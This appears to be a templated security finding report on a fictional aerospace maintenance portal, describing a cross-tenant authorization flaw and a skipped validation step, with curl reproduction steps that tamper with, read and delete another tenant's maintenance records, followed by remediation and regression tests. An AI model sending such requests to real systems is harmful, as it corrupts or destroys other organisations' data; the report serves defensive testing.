## System

- System: WingTech Maintenance Portal v3.1.0
- Domain: AEROSPACE / MRO
- Example ID: BOLA-0076
- Risk ID: RISK-32-076

## Findings

### 1. Pattern 3.2 — Workflow Decoupling + Cross-Tenant Maintenance Node PATCH (HAR Primary)

**HAR evidence**: JWT `X-Tenant-ID: ORG-E549`. Request: `PATCH /api/v1/nodes/NOD-2076`. Response: HTTP 200 OK with `"tenantId": "ORG-62CB"`, `"sensitiveData": "CONFIDENTIAL: cross-tenant data for ORG-62CB"`.

**Pattern 3.2 (Workflow Decoupling — Insecure Design)**: Section 4.0 documents the specific workflow vulnerability: "Multi-step workflow: `POST /api/v1/nodes/:id/submit` succeeds without completing the prior `/validate` step." In Aerospace/MRO, maintenance nodes represent aircraft maintenance work orders, parts certifications, or airworthiness directives. The insecure design allows an attacker to:
1. PATCH a cross-tenant maintenance node (bypass ownership — BOLA component, HAR primary)
2. POST `/api/v1/nodes/:id/submit` directly without completing the required `/validate` step — bypassing mandatory safety validation

Skipping `/validate` before `/submit` means aircraft maintenance work is approved without safety inspection, violating FAA/EASA regulatory workflow requirements. The PATCH also allows cross-tenant modification of another airline's maintenance records.

Section 3.0: "Application code does NOT use tenant_id in authorization checks." Section 4.0 (RISK-32-076): handler lacks tenant/owner filter.

**Aerospace / MRO impact**: unauthorized PATCH of maintenance nodes corrupts another airline's maintenance records. Workflow bypass (`/submit` without `/validate`) allows unapproved maintenance work orders to be submitted to regulatory systems — direct airworthiness risk.

## Reproduction

**Step 1 — Baseline:**

```bash
curl -s "https://api.wingtech-mainte.example.com/api/v1/nodes/NOD-1076" \
  -H "Authorization: Bearer <TOKEN_TENANT_ORG-E549>" \
  -H "X-Tenant-ID: ORG-E549"
```

Expected: `tenantId: "ORG-E549"` — own maintenance node.

**Step 2 — Cross-tenant maintenance node PATCH (primary HAR attack):**

```bash
curl -s -X PATCH "https://api.wingtech-mainte.example.com/api/v1/nodes/NOD-2076" \
  -H "Authorization: Bearer <TOKEN_TENANT_ORG-E549>" \
  -H "X-Tenant-ID: ORG-E549" \
  -H "Content-Type: application/json" \
  -d '{"status": "approved", "sensitive_data": "tampered_by_attacker"}'
```

Expected secure: HTTP 403 or 404.  
Expected vulnerable: HTTP 200 with `tenantId: "ORG-62CB"` — competitor's maintenance record tampered.

**Step 3 — Workflow bypass: submit without validate (Pattern 3.2 primary):**

```bash
# Skip the required /validate step and directly submit:
curl -s -X POST "https://api.wingtech-mainte.example.com/api/v1/nodes/NOD-2076/submit" \
  -H "Authorization: Bearer <TOKEN_TENANT_ORG-E549>" \
  -H "X-Tenant-ID: ORG-E549" \
  -H "Content-Type: application/json"
```

Expected secure: HTTP 400/403 — "Validation step not completed."  
Expected vulnerable: HTTP 200 — maintenance work order submitted to regulatory system without safety validation.

**Step 4 — Cross-tenant read and delete:**

```bash
curl -s "https://api.wingtech-mainte.example.com/api/v1/nodes/NOD-2076" \
  -H "Authorization: Bearer <TOKEN_TENANT_ORG-E549>" \
  -H "X-Tenant-ID: ORG-E549"

curl -s -X DELETE "https://api.wingtech-mainte.example.com/api/v1/nodes/NOD-2076" \
  -H "Authorization: Bearer <TOKEN_TENANT_ORG-E549>" \
  -H "X-Tenant-ID: ORG-E549"
```

## Evidence

- **HAR**: `PATCH /api/v1/nodes/NOD-2076` with `ORG-E549` JWT → HTTP 200 → `tenantId: ORG-62CB` with `sensitiveData`.
- **Section 4.0 (RISK-32-076)**: Pattern 3.2 — GET/PATCH/DELETE lack tenant/owner filter.
- **Section 4.0**: Workflow decoupling — `POST /submit` executes without prior `/validate`.
- **Section 3.0**: Application code does not use `tenant_id` in authorization checks.

## Remediation

- **Add `WHERE tenant_id = $jwt_tenant_id AND owner_id = $jwt_sub`** to GET/PATCH/DELETE handlers (RISK-32-076, unblock #DB-176).
- **Enforce workflow state machine**: server must verify node has completed `/validate` before accepting `/submit`; reject out-of-order transitions with HTTP 400.
- **Store workflow state server-side**: never allow client to trigger later workflow steps without server-verified prior step completion.
- **Regression test**: Tenant A token patches Tenant B `node_id` — assert HTTP 403/404. Attempt `/submit` without `/validate` — assert HTTP 400.
